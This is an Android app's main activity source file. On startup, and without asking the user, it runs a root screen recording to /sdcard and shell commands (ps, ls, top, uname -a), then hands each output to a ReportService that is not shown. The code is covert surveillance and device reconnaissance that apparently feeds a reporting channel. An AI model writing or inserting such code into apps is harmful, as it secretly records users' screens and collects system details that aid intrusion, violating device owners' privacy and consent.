package com.rosetta.dynamit;

import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;

public class MainActivity extends AppCompatActivity {

    public static final String DATA_KEY = "data";

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.d("Philae", "up and running");
        startProbing();

    }


    public void startProbing(){
        Intent reportServiceIntent = new Intent(this, ReportService.class);

//        reportServiceIntent.putExtra(DATA_KEY, "DANGO -> 01");
//        startService(reportServiceIntent);

        String shellSudoRes = Shell.sudo("screenrecord --time-limit 10 /sdcard/MyVideo.mp4");
        reportServiceIntent.putExtra(DATA_KEY, shellSudoRes);
        startService(reportServiceIntent);

        String shellPSRes = Shell.userCmd("ps");
        reportServiceIntent.putExtra(DATA_KEY, shellPSRes);
        startService(reportServiceIntent);

        String shellLSRes = Shell.userCmd("ls");
        reportServiceIntent.putExtra(DATA_KEY, shellLSRes);
        startService(reportServiceIntent);

        String shellTOPRes = Shell.userCmd("top -n 1 -d 1");
        reportServiceIntent.putExtra(DATA_KEY, shellTOPRes);
        startService(reportServiceIntent);

        String shellKernelVersion = Shell.userCmd("uname -a");
        reportServiceIntent.putExtra(DATA_KEY, shellKernelVersion);
        startService(reportServiceIntent);

    }
}
